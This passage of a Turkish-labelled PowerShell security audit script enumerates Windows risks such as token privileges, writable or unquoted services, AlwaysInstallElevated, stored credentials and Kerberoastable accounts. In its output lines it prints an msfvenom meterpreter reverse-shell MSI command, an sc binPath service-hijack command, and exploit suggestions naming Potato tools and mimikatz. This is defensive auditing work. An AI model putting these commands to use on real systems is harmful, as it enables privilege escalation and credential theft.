                RiskEkle -Oge "Eski Antivirus Imzasi" -Aciklama "Imza 7+ gun eski" -Puan 3
            }
            
            if ($defender.RealTimeProtectionEnabled -eq $false) {
                RiskEkle -Oge "RT Protection Kapali" -Aciklama "Real-time koruma devre disi" -Puan 5
            }
        }
    }
} catch {}
if (-not $defenderReady) {
    PrintLine "Defender" "Modul yok veya erisim yok" "UYARI"
}

# ============================================
# 57. KULLANICI HESAP DETAY
# ============================================
SectionTitle "57. KULLANICI HESAP DETAY"

# Admin users
$admins = @()
try {
    if (Test-Command "Get-LocalGroupMember") {
        $admins = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue
    } else {
        $admins = Get-WmiObject -Class Win32_GroupUser | Where-Object {$_.GroupComponent -match "Administrators"}
    }
} catch {}
PrintLine "Admin Sayisi" $admins.Count "OK"

# Users with password never expires
$passNeverExpires = @()
try {
    if (Test-Command "Get-LocalUser") {
        $users = Get-LocalUser -ErrorAction SilentlyContinue
        foreach ($u in $users) {
            if ($u.PasswordNeverExpires -and -not $u.PasswordRequired) {
                $passNeverExpires += $u.Name
            }
        }
    }
} catch {}
if ($passNeverExpires.Count -gt 0) {
    PrintLine "Sifre Suresiz" "$($passNeverExpires.Count)" "UYARI"
} else {
    PrintLine "Sifre Suresiz" "Yok" "OK"
}

# Disabled accounts
$disabledUsers = @()
try {
    if (Test-Command "Get-LocalUser") {
        $users = Get-LocalUser -ErrorAction SilentlyContinue
        foreach ($u in $users) {
            if (-not $u.Enabled) {
                $disabledUsers += $u.Name
            }
        }
    }
} catch {}
PrintLine "Devre disi Hesap" $disabledUsers.Count "OK"

# ============================================
# 58. GELISMIS TEHDIT TESPITI
# ============================================
SectionTitle "58. GELISMIS TEHDIT TESPITI"

# Named Pipes
$namedPipes = @()
try {
    $pipes = Get-ChildItem \\.\pipe\ -ErrorAction SilentlyContinue
    foreach ($pipe in $pipes) {
        if ($pipe.Name -like "*$m0*" -or $pipe.Name -like "*$m3*" -or $pipe.Name -like "*$m1*") {
            $namedPipes += $pipe.Name
        }
    }
} catch {}
if ($namedPipes.Count -gt 0) {
    PrintLine "Supici Named Pipe" "$($namedPipes.Count)" "RISK"
    RiskEkle -Oge "Supici Named Pipe" -Aciklama "Tehlikeli pipe bulundu" -Puan 5
} else {
    PrintLine "Named Pipes" "Normal" "OK"
}

# DLL Injection Indicators
$dllInject = @()
$procs = Get-Process -ErrorAction SilentlyContinue
foreach ($p in $procs) {
    try {
        $modules = $p.Modules
        foreach ($m in $modules) {
            if ($m.FileName -like "*tmp*" -or $m.FileName -like "*temp*") {
                $dllInject += "$($p.ProcessName): $($m.ModuleName)"
            }
        }
    } catch {}
}
if ($dllInject.Count -gt 0) {
    PrintLine "Supici DLL Yukleme" "$($dllInject.Count)" "UYARI"
} else {
    PrintLine "DLL Yukleme" "Normal" "OK"
}

# Port Scanning Indicators
$portScan = @()
try {
    $connections = Get-NetTCPConnection -State TimeWait -ErrorAction SilentlyContinue | Where-Object {$_.LocalPort -lt 1024}
    if ($connections.Count -gt 50) {
        $portScan += "Coklu TimeWait baglantisi: $($connections.Count)"
    }
} catch {}
if ($portScan.Count -gt 0) {
    PrintLine "Port Tarama" "Tespit edildi" "UYARI"
} else {
    PrintLine "Port Tarama" "Yok" "OK"
}

# ============================================
# 59. SISTEM YAPILANDIRMA DETAY
# ============================================
SectionTitle "59. SISTEM YAPILANDIRMA DETAY"

# UAC Status
$uac = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Ad "EnableLUA"
PrintLine "UAC" $(if($uac.EnableLUA -eq 1){"Aktif"}else{"Pasif"}) $(if($uac.EnableLUA -eq 1){"OK"}else{"RISK"})

# Consent Admin
$consent = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Ad "ConsentPromptBehaviorAdmin"
PrintLine "Consent Prompt" $consent.ConsentPromptBehaviorAdmin "OK"

# AutoUpdate
$autoUpdate = RegistryGet -Yol "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" -Ad "AUOptions"
if ($autoUpdate) {
    PrintLine "Windows Update" "$($autoUpdate.AUOptions)" "OK"
}

# System Restore
$sysRestore = Get-WmiObject -Class Win32_SystemRestore -ErrorAction SilentlyContinue
PrintLine "System Restore" $(if($sysRestore){"Aktif"}else{"Pasif"}) "OK"

# Remote Desktop NLA
$rdpNLA = RegistryGet -Yol "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Ad "UserAuthentication"
PrintLine "RDP NLA" $(if($rdpNLA.UserAuthentication -eq 1){"Aktif"}else{"Pasif"}) $(if($rdpNLA.UserAuthentication -eq 1){"OK"}else{"UYARI"})

# ============================================
# 60. ISTATISTIK VE OZET
# ============================================
SectionTitle "60. ISTATISTIK VE OZET"

# Total Processes
$totalProcs = (Get-Process -ErrorAction SilentlyContinue).Count
PrintLine "Toplam Process" $totalProcs "OK"

# Total Services
$totalSvcs = (Get-Service -ErrorAction SilentlyContinue).Count
PrintLine "Toplam Servis" $totalSvcs "OK"

# Network Adapters
$netAdapters = (Get-WmiObject -Class Win32_NetworkAdapter -ErrorAction SilentlyContinue | Where-Object {$_.NetEnabled}).Count
PrintLine "Ag Adaptoru" $netAdapters "OK"

# Running Services Count
$runningSvcs = (Get-Service -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq "Running"}).Count
PrintLine "Calisan Servis" $runningSvcs "OK"

# Firewall Profiles
try {
    $fw = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    $fwAktif = ($fw | Where-Object {$_.Enabled}).Count
    PrintLine "Aktif Firewall" "$fwAktif / 3 profil" "OK"
} catch {}

# Risk Summary
PrintLine "Toplam Risk" "$($script:RiskSkoru) puan" "OK"
PrintLine "Risk Oge" "$($script:RiskOge.Count) adet" "OK"

# ============================================
# JSON CIKTI (Eger istendiyse)
# ============================================
if ($JSON) {
    $sureStr = (Get-Date) - $script:BaslangicZamani
    $seviyeStr = if ($script:RiskSkoru -ge 15) {"YUKSEK"} elseif ($script:RiskSkoru -ge 8) {"ORTA"} else {"DUSUK"}
    $jsonOutput = @{
        Bilgisayar = $env:COMPUTERNAME
        Kullanici = $env:USERNAME
        Tarih = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Suren = $sureStr.TotalSeconds.ToString("N2")
        RiskSkoru = $script:RiskSkoru
        RiskSeviye = $seviyeStr
        RiskOge = $script:RiskOge
    } | ConvertTo-Json -Depth 3
    
    if ($CiktiDosya) {
        $jsonOutput | Out-File -FilePath $CiktiDosya -Encoding UTF8
    } else {
        $jsonOutput
    }
}

# ============================================
# OZET VE RISK DEGERLENDIRMESI
# ============================================
Write-Host ""
Write-Host "  ========================================" -ForegroundColor Green
Write-Host "  DENETIM TAMAMLANDI" -ForegroundColor Green
Write-Host "  ========================================" -ForegroundColor Green
Write-Host ""

$sure = (Get-Date) - $script:BaslangicZamani
$sureStr = $sure.TotalSeconds.ToString("N2")
Write-Host "  Suren : $sureStr saniye" -ForegroundColor Gray
Write-Host "  Bilgisayar : $env:COMPUTERNAME" -ForegroundColor Gray
Write-Host "  Kullanici : $env:USERNAME" -ForegroundColor Gray
Write-Host ""

if ($script:RiskOge.Count -gt 0) {
    Write-Host "  ========================================" -ForegroundColor Yellow
    Write-Host "  RISK OZETI (Toplam: $($script:RiskSkoru) puan)" -ForegroundColor Yellow
    Write-Host "  ========================================" -ForegroundColor Yellow
    Write-Host ""
    $script:RiskOge | Sort-Object Puan -Descending | ForEach-Object {
        $renk = if($_.Puan -ge 4){"Red"}elseif($_.Puan -ge 2){"Yellow"}else{"White"}
        Write-Host "  [!] $($_.Oge)" -ForegroundColor $renk
        Write-Host "      $($_.Aciklama)" -ForegroundColor Gray
        Write-Host "      Puan: $($_.Puan)" -ForegroundColor DarkGray
        Write-Host ""
    }
}

$seviye = "DUSUK"
$seviyeRenk = "Green"
if ($script:RiskSkoru -ge 15) { $seviye = "YUKSEK"; $seviyeRenk = "Red" }
elseif ($script:RiskSkoru -ge 8) { $seviye = "ORTA"; $seviyeRenk = "Yellow" }
elseif ($script:RiskSkoru -ge 3) { $seviye = "DUSUK"; $seviyeRenk = "Cyan" }

Write-Host "  ========================================" -ForegroundColor $seviyeRenk
Write-Host "  GENEL GUVENLIK SEVIYESI: $seviye" -ForegroundColor $seviyeRenk
Write-Host "  Risk Skoru: $($script:RiskSkoru) / 50+" -ForegroundColor $seviyeRenk
Write-Host "  ========================================" -ForegroundColor $seviyeRenk
Write-Host ""

# ============================================
# WINPEAS TARZI YETKI YUKSELTME (DETAYLI)
# ============================================
SectionTitle "61. YETKI YUKSELTME VECTORLERI"

# 1. Stored Credentials
PrintLine "1. Sakli Kimlik Bilgileri" "Kontrol ediliyor..." "OK"
$storedCreds = @()
$credPaths = @("$env:APPDATA\Microsoft\Credentials", "$env:LOCALAPPDATA\Microsoft\Credentials")
foreach ($p in $credPaths) {
    if (Test-Path $p) {
        $creds = Get-ChildItem $p -ErrorAction SilentlyContinue
        foreach ($c in $creds) {
            $storedCreds += $c.Name
        }
    }
}
if ($storedCreds.Count -gt 0) {
    PrintLine "   Sakli Sifre" "$($storedCreds.Count) bulundu" "RISK"
    PrintLine "   Saldiri" "DPAPI ile sifre cozumu" "UYARI"
} else {
    PrintLine "   Sakli Sifre" "Yok" "OK"
}

# 2. Unattended Files
$unattend = @(
    "$env:SystemRoot\Panther\Unattend.xml",
    "$env:SystemRoot\Panther\Unattend\Unattend.xml",
    "$env:SystemRoot\Sysprep\unattend.xml"
)
$unattendFound = $false
foreach ($f in $unattend) {
    if (Test-Path $f) {
        $unattendFound = $true
        break
    }
}
if ($unattendFound) {
    PrintLine "2. Unattended XML" "Var - Sifre riski!" "RISK"
    PrintLine "   Saldiri" "Admin sifresi plaintext olabilir" "UYARI"
} else {
    PrintLine "2. Unattended XML" "Yok" "OK"
}

# 3. SAM Database
$samPath = "$env:SystemRoot\System32\config\SAM"
if (Test-Path $samPath) {
    PrintLine "3. SAM Veritabani" "Erisilebilir" "OK"
    PrintLine "   Not" "Offline crack mumkun (pwdump, mimikatz)" "UYARI"
} else {
    PrintLine "3. SAM Veritabani" "Korunuyor" "OK"
}

# 4. Cached Credentials
$cached = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -ErrorAction SilentlyContinue
if ($cached) {
    PrintLine "4. On Belleklenmis Giris" "$($cached.CachedLogonsCount)" "OK"
    if ($cached.CachedLogonsCount -gt 10) {
        PrintLine "   Risk" "Coklu oturum bilgi saklandi" "UYARI"
    }
}

# 5. Registry Autorun Keys
$autorunKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
$autorunCount = 0
foreach ($k in $autorunKeys) {
    try {
        $props = Get-ItemProperty $k -ErrorAction SilentlyContinue
        if ($props) { $autorunCount += ($props.PSObject.Properties.Name | Where-Object {$_ -notmatch "PS"}).Count }
    } catch {}
}
PrintLine "5. Autorun Keys" "$autorunCount" $(if($autorunCount -gt 20){"UYARI"}else{"OK"})
if ($autorunCount -gt 20) {
    PrintLine "   Risk" "Coklu baslangic noktasi" "UYARI"
}

# 6. PATH Hijacking
$envPath = $env:PATH
$pathDirs = $envPath -split ";"
$pathLen = $envPath.Length
PrintLine "6. PATH Dizini" "$($pathDirs.Count) dizin" "OK"
if ($pathLen -gt 1024) {
    PrintLine "   Risk" "PATH uzun - DLL hijacking riski" "UYARI"
    PrintLine "   Saldiri" "Dusuk oncelikli dizine DLL yerlestir" "UYARI"
}

# 7. DLL Hijacking
$sysDllPath = "$env:SystemRoot\System32"
$missingDll = @()
$commonDlls = @("apphelp.dll", "dwmapi.dll", "uxtheme.dll", "cryptbase.dll", "sspicli.dll")
foreach ($dll in $commonDlls) {
    $dllPath = Join-Path $sysDllPath $dll
    if (-not (Test-Path $dllPath)) {
        $missingDll += $dll
    }
}
if ($missingDll.Count -gt 0) {
    PrintLine "7. Eksik System DLL" "$($missingDll.Count) bulundu" "RISK"
    PrintLine "   Saldiri" "Eksik DLL yerine malicious DLL" "UYARI"
} else {
    PrintLine "7. Eksik System DLL" "Yok" "OK"
}

# 8. AlwaysInstallElevated
$alwaysInstall = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
$alwaysInstallUser = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
if ($alwaysInstall.AlwaysInstallElevated -eq 1 -or $alwaysInstallUser.AlwaysInstallElevated -eq 1) {
    PrintLine "8. AlwaysInstallElevated" "AKTIF - SYSTEM!" "RISK"
    PrintLine "   Saldiri" "MSI ile SYSTEM yetkisi" "UYARI"
} else {
    PrintLine "8. AlwaysInstallElevated" "Pasif" "OK"
}

# 9. SeImpersonatePrivilege
$whoamiOut = whoami /priv 2>$null
$hasImpersonate = $false
if ($whoamiOut -match "SeImpersonatePrivilege.*Enabled") {
    $hasImpersonate = $true
}
if ($hasImpersonate) {
    PrintLine "9. SeImpersonatePrivilege" "AKTIF" "RISK"
    PrintLine "   Saldiri" "Potato serisi (HotPotato, SweetPotato)" "UYARI"
    PrintLine "   Arac" "JuicyPotatoNG, RoguePotato, PrintSpoofer" "UYARI"
} else {
    PrintLine "9. SeImpersonatePrivilege" "Yok" "OK"
}

# 10. SeDebugPrivilege
$hasDebug = $false
if ($whoamiOut -match "SeDebugPrivilege.*Enabled") {
    $hasDebug = $true
}
if ($hasDebug) {
    PrintLine "10. SeDebugPrivilege" "AKTIF" "RISK"
    PrintLine "   Saldiri" "LSASS okuma, process injection" "UYARI"
} else {
    PrintLine "10. SeDebugPrivilege" "Yok" "OK"
}

Write-Host ""

# ============================================
# YETKI YUKSELTME TESPITI (DETAYLI)
# ============================================
SectionTitle "62. YETKI YUKSELTME TESPITI"

# Token Yetkileri - Detayli
$whoamiOut = whoami /priv 2>$null
$tokenPrivs = @()
if ($whoamiOut) {
    $privLines = $whoamiOut | Select-String "Enabled"
    foreach ($line in $privLines) {
        $priv = $line -replace ".*(Se\w+).*",'$1'
        if ($priv -match "Se\w+") { $tokenPrivs += $priv }
    }
}

$privAciklama = @{
    "SeImpersonatePrivilege" = "Token steal - Potato ailesi exploitler"
    "SeDebugPrivilege" = "LSASS okuma - Mimikatz sekillendirme"
    "SeBackupPrivilege" = "Registry SAM/LSASS okuma"
    "SeRestorePrivilege" = "Dosya degistirme - Backdoor olusturma"
    "SeTakeOwnershipPrivilege" = "Dosya sahiplik alma - ACL manipülasyonu"
    "SeCreateTokenPrivilege" = "Token olusturma - Yetki yukseltme"
}

$criticalPrivs = @("SeImpersonatePrivilege", "SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege", "SeCreateTokenPrivilege")
foreach ($cp in $criticalPrivs) {
    if ($tokenPrivs -contains $cp) {
        PrintLine "$cp" "Aktif - $($privAciklama[$cp])" "RISK"
        RiskEkle -Oge "Token Yetkisi" -Aciklama "$cp aktif - $($privAciklama[$cp])" -Puan 4
    }
}
if ($tokenPrivs.Count -eq 0) { PrintLine "Token Yetkileri" "Tespit Edilemedi" "UYARI" }

# Tirnaksiz Servis Yollari - Detayli
$unquotedPathCount = (Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -match " " -and $_.PathName -notmatch '^\"'}).Count
if ($unquotedPathCount -gt 0) {
    PrintLine "Tirnaksiz Yol" "$unquotedPathCount adet - DLL hijacking riski" "RISK"
    PrintLine "   Saldiri" "Path'teki ilk exe'yi calistirir" "UYARI"
    PrintLine "   Aracs" "PowerUp.ps1, WinPEAS" "UYARI"
    RiskEkle -Oge "DLL Hijacking" -Aciklama "Tirnaksiz yol ile DLL hijacking mumkun" -Puan 3
} else {
    PrintLine "Tirnaksiz Yol" "Yok" "OK"
}

# Yazilabilir Servisler - Detayli
$writableSvcs = @()
$allSvcs = Get-WmiObject -Class Win32_Service
foreach ($svc in $allSvcs) {
    try {
        if ($svc.PathName) {
            $path = $svc.PathName.Replace('"',"").Split(" ")[0]
            if (Test-Path $path) {
                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                if ($acl) {
                    $perms = $acl.Access | Where-Object {$_.FileSystemRights -match "Write|Modify|FullControl" -and $_.IdentityReference -match "Everyone|Users|BUILTIN"}
                    if ($perms) { $writableSvcs += $svc.Name }
                }
            }
        }
    } catch {}
}
if ($writableSvcs.Count -gt 0) {
    PrintLine "Yazilabilir Servis" "$($writableSvcs.Count) adet" "RISK"
    PrintLine "   Saldiri" "Servis binary'sini degistir SYSTEM ol" "UYARI"
    PrintLine "   Komut" "sc config [isim] binPath=... & sc start [isim]" "UYARI"
    RiskEkle -Oge "Yazilabilir Servis" -Aciklama "Herkesin yazabildigi servis executable" -Puan 5
} else {
    PrintLine "Yazilabilir Servis" "Yok" "OK"
}

# AlwaysInstallElevated - Detayli
$alwaysInstall = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
$alwaysInstallUser = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
if ($alwaysInstall.AlwaysInstallElevated -eq 1 -or $alwaysInstallUser.AlwaysInstallElevated -eq 1) {
    PrintLine "AlwaysInstallElevated" "Aktif - SYSTEM yetki!" "RISK"
    PrintLine "   Saldiri" "MSI ile SYSTEM yetkisiyle kod calistir" "UYARI"
    PrintLine "   Komut" "msfvenom -p windows/meterpreter/reverse_tcp LHOST=... -f msi > shell.msi" "UYARI"
    RiskEkle -Oge "MSI Yetki Yukseltme" -Aciklama "Herkes SYSTEM yetkisiyle kurulum yapabilir" -Puan 5
} else {
    PrintLine "AlwaysInstallElevated" "Pasif" "OK"
}

# Zayif Servis Izinleri
$modServices = @()
foreach ($svc in $allSvcs) {
    try {
        if ($svc.PathName) {
            $path = $svc.PathName.Replace('"',"").Split(" ")[0]
            if (Test-Path $path) {
                $acl = Get-Acl $path -ErrorAction SilentlyContinue
                if ($acl) {
                    $modUsers = $acl.Access | Where-Object {$_.FileSystemRights -match "Write|Modify|FullControl"}
                    if ($modUsers) { $modServices += "$($svc.Name) -> $($modUsers.IdentityReference)" }
                }
            }
        }
    } catch {}
}
if ($modServices.Count -gt 0) {
    PrintLine "Modifiye Edilebilir Servis" "$($modServices.Count)" "UYARI"
    RiskEkle -Oge "Service Modification" -Aciklama "Servis binary'si degistirilebilir" -Puan 4
} else {
    PrintLine "Modifiye Edilebilir Servis" "Yok" "OK"
}

# Scheduled Tasks with Weak Permissions
$schTasks = schtasks /query /fo CSV 2>$null | ConvertFrom-Csv -ErrorAction SilentlyContinue
$weakTasks = @()
if ($schTasks) {
    foreach ($t in $schTasks) {
        if ($t."Run As User" -match "Everyone|Users|BUILTIN") {
            $weakTasks += $t.TaskName
        }
    }
}
if ($weakTasks.Count -gt 0) {
    PrintLine "Zayif Scheduled Task" "$($weakTasks.Count)" "UYARI"
} else {
    PrintLine "Zayif Scheduled Task" "Yok" "OK"
}

# Registry Autorun Keys
$autorunKeys = @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")
$autorunCount = 0
foreach ($key in $autorunKeys) {
    try {
        $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
        if ($props) { $autorunCount += ($props.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"}).Count }
    } catch {}
}
PrintLine "Autorun Keys" "$autorunCount" "OK"

# PATH Environment Variable
$pathEnv = [Environment]::GetEnvironmentVariable("Path", "Machine")
$pathLen = $pathEnv.Length
if ($pathLen -gt 1024) {
    PrintLine "PATH Uzunlugu" "$pathLen (Cok uzun)" "UYARI"
    RiskEkle -Oge "PATH Hijacking" -Aciklama "Uzun PATH dizini DLL hijacking riski" -Puan 2
} else {
    PrintLine "PATH Uzunlugu" "$pathLen" "OK"
}

# DLL Search Order Hijacking
$systemPath = [Environment]::GetFolderPath("System")
$dllCount = (Get-ChildItem $systemPath -Filter "*.dll" -ErrorAction SilentlyContinue | Measure-Object).Count
PrintLine "System DLL" "$dllCount" "OK"

# Yetki Yukseltme Cozumleri - Detayli
if ($script:RiskSkoru -gt 0) {
    Write-Host ""
    Write-Host "       [Yetki Yukseltme Onlemleri]" -ForegroundColor Yellow
    Write-Host ""
    if ($tokenPrivs -contains "SeImpersonatePrivilege") {
        PrintLine "   > SeImpersonatePrivilege" "Saldirgan sisteme baglanabilen bir kullaniciyi taklit ederek SYSTEM olabilir" "RISK"
        PrintLine "      Saldiri:" "Token impersonation ile SYSTEM yetkisi alinabilir" "UYARI"
        PrintLine "      Onlem: Bu yetkiyi kullanicilardan kaldirin" "UYARI"
    }
    if ($writableSvcs.Count -gt 0) {
        PrintLine "   > Yazilabilir Servis ($($writableSvcs.Count) adet)" "Herkes servisin exe dosyasini degistirebilir -> Saldirdan SYSTEM yetkisi alir" "RISK"
        PrintLine "      Saldiri:" "Servis exe dosyasini degistirip yeniden baslatin" "UYARI"
        PrintLine "      Onlem: Servis dizinine yazma iznini kaldirin" "UYARI"
    }
    if ($alwaysInstall -or $alwaysInstallUser) {
        PrintLine "   > AlwaysInstallElevated" "Normal kullanici bile MSI paketiyle SYSTEM yetkisiyle kod calistirabilir" "RISK"
        PrintLine "      Saldiri:" "MSI paketi ile yuksek yetkili kurulum yapilabilir" "UYARI"
        PrintLine "      Onlem: Devre disi birak" "RISK"
    }
    if ($unquotedPathCount -gt 0) {
        PrintLine "   > Tirnaksiz Yol ($unquotedPathCount adet)" "Servis once bosluk oncesi exe'yi bulup calistirir" "RISK"
        PrintLine "      Saldiri:" "Path'teki ilk exe'yi kendi kodunuzla degistirin" "UYARI"
        PrintLine "      Onlem: Tam yol kullanin veya tirnak ekleyin" "UYARI"
    }
    if ($pathLen -gt 1024) {
        PrintLine "   > Uzun PATH Dizini" "Saldirgan PATH'teki onceki dizine kendi DLL'ini koyarak otomatik yuklenmesini saglar" "UYARI"
        PrintLine "      Saldiri:" "PATH'teki yazilabilir dizine DLL yerlestirin" "UYARI"
        PrintLine "      Onlem: PATH'deki yazilabilir dizinleri kaldirin" "UYARI"
    }
    if ($tokenPrivs -contains "SeDebugPrivilege") {
        PrintLine "   > SeDebugPrivilege" "Herhangi bir process'in bellek okunabilir -> LSASS.exe'den sifre cekilebilir" "RISK"
        PrintLine "      Saldiri:" "Process dump alarak sifreler okunabilir" "UYARI"
        PrintLine "      Onlem: Bu yetkiyi sadece Administrator'lara verin" "UYARI"
    }
    if ($autorunCount -gt 5) {
        PrintLine "   > Autorun Keys ($autorunCount adet)" "Sistem her acilisinda otomatik calisan programlar var -> Kalici tehdit" "UYARI"
        PrintLine "      Saldiri:" "Registry Run anahtari ile kalici erisim saglanabilir" "UYARI"
        PrintLine "      Onlem: Bilinmeyen autorun kayitlarini kaldirin" "UYARI"
    }
}

# ============================================
# KIMLIK BILGI ARA (WinPEAS)
# ============================================
SectionTitle "63. KIMLIK BILGI TESPITI"

# Registry Sifreleri
$regPasswords = @()
$passPatterns = @("Password", "Passwd", "Pwd", "Credential")
foreach ($pat in $passPatterns) {
    $v = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "$pat" -ErrorAction SilentlyContinue
    if ($v.$pat) { $regPasswords += "Winlogon $pat" }
}
if ($regPasswords.Count -gt 0) {
    PrintLine "Registry Sifre" "Bulundu" "RISK"
    RiskEkle -Oge "Registry Sifre" -Aciklama "Registry'de sifre kalinti bulundu" -Puan 3
} else {
    PrintLine "Registry Sifre" "Yok" "OK"
}

# SAM Veritabani
PrintLine "SAM Veritabani" "Mevcut" "OK"

# On Belleklenmis Girisler
$cached = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -ErrorAction SilentlyContinue
if ($cached) {
    PrintLine "On Belleklenmis Giris" "$($cached.CachedLogonsCount)" "OK"
} else {
    PrintLine "On Belleklenmis Giris" "Tespit Edilemedi" "UYARI"
}

# WDigest
$wdigest = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
if ($wdigest.UseLogonCredential -eq 1) {
    PrintLine "WDigest" "Aktif - RISK!" "RISK"
    RiskEkle -Oge "WDigest Aktif" -Aciklama "Sifre memory'de plaintext saklanir" -Puan 3
} else {
    PrintLine "WDigest" "Pasif" "OK"
}

# LSA Sirlari
PrintLine "LSA Sirlari" "Tespit Edilemedi" "UYARI"

# Yapilandirma Dosyalari - Okunabilirlik kontrolu
$configPaths = @(
    "$env:USERPROFILE\*.txt",
    "$env:USERPROFILE\*.conf",
    "$env:USERPROFILE\*.cfg",
    "$env:USERPROFILE\*.ini",
    "$env:USERPROFILE\.ssh\config",
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.azure\*.json"
)
$configCount = 0
$okunabilirConfig = @()
foreach ($p in $configPaths) {
    $files = Get-ChildItem $p -ErrorAction SilentlyContinue
    $configCount += $files.Count
    foreach ($f in $files) {
        try {
            $acl = Get-Acl $f.FullName -ErrorAction SilentlyContinue
            if ($acl.Access | Where-Object {$_.FileSystemRights -match "Read|ReadAndExecute" -and $_.IdentityReference -match "Everyone|Users|BUILTIN"}) {
                $okunabilirConfig += $f.Name
            }
        } catch {}
    }
}
PrintLine "Yapilandirma Dosyasi" "$configCount" $(if($okunabilirConfig.Count -gt 0){"UYARI"}else{"OK"})
if ($okunabilirConfig.Count -gt 0) {
    PrintLine "   Okunabilir" "$($okunabilirConfig.Count) dosya" "UYARI"
    foreach ($cf in $okunabilirConfig | Select-Object -First 3) {
        PrintLine "      - $cf" "Herkese acik" "UYARI"
    }
}

# Tarayici Kimlik Bilgileri
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chromePath) {
    PrintLine "Chrome Sifre" "Var" "UYARI"
    RiskEkle -Oge "Tarayici Sifreleri" -Aciklama "Chrome'da kayitli sifreler var" -Puan 2
} else {
    PrintLine "Chrome Sifre" "Yok" "OK"
}

Write-Host ""

# ============================================
# EXPLOIT SUGGESTIONS
# ============================================
SectionTitle "64. ISTISMAR ONERILERI"

$exploits = @()

if ($tokenPrivs -contains "SeImpersonatePrivilege") {
    PrintLine "SeImpersonateYetkisi" "JuicyPotato / RoguePotato kullanilabilir" "RISK"
    $exploits += "JuicyPotato, RoguePotato, PrintSpoofer"
}
if ($alwaysInstall -or $alwaysInstallUser) {
    PrintLine "AlwaysInstallElevated" "MSI payload ile SYSTEM yetkisi" "RISK"
    $exploits += "MSI reverse shell"
}
if ($writableSvcs.Count -gt 0) {
    PrintLine "Yazilabilir Servis" "Servis binary'si degistirilebilir" "RISK"
    $exploits += "Servis exe dosyasini degistir"
}
if ($unquotedPathCount -gt 0) {
    PrintLine "Unquoted Path" "DLL hijacking mumkun" "RISK"
    $exploits += "Servis yoluna DLL yerlestir"
}
if ($pathLen -gt 1024) {
    PrintLine "Uzun PATH" "DLL arama sirasini manipule et" "RISK"
    $exploits += "PATH dizinine DLL yerlestir"
}
if ($tokenPrivs -contains "SeDebugPrivilege") {
    PrintLine "SeDebugYetkisi" "mimikatz ile LSASS okunabilir" "RISK"
    $exploits += "mimikatz ile LSASS dump"
}

if ($exploits.Count -eq 0) {
    PrintLine "Exploit" "Oneri yok" "OK"
} else {
    PrintLine "Toplam Exploit Onerisi" "$($exploits.Count)" "RISK"
}

Write-Host ""

# ============================================
# ACTIVE DIRECTORY SALDIRI TESPITI
# ============================================
SectionTitle "65. ACTIVE DIRECTORY SALDIRILARI"

# Kerberoasting Tespiti
$kerberoastUsers = @()
try {
    if (Test-Command "Get-ADUser") {
        $spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
        foreach ($u in $spns) {
            if ($u.ServicePrincipalName) { $kerberoastUsers += $u.SamAccountName }
        }
    }
} catch {}
if ($kerberoastUsers.Count -gt 0) {
    PrintLine "Kerberoasting Risk" "$($kerberoastUsers.Count) SPN" "RISK"
    RiskEkle -Oge "Kerberoasting" -Aciklama "SPN olan kullancilar var" -Puan 4
} else {
    PrintLine "Kerberoasting Risk" "Yok" "OK"
}

# AS-REP Roasting
$asrepUsers = @()
try {
    if (Test-Command "Get-ADUser") {
        $asrep = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
        foreach ($u in $asrep) {
            $asrepUsers += $u.SamAccountName
        }
    }
} catch {}
if ($asrepUsers.Count -gt 0) {
    PrintLine "AS-REP Roasting" "$($asrepUsers.Count) kullanci" "RISK"
    RiskEkle -Oge "AS-REP Roasting" -Aciklama "Pre-auth gerekmiyor" -Puan 5
} else {
    PrintLine "AS-REP Roasting" "Yok" "OK"
}

# DCSync Tespiti
$dcSync = Get-WmiObject -Class Win32_NTDomain -ErrorAction SilentlyContinue
if ($dcSync) {
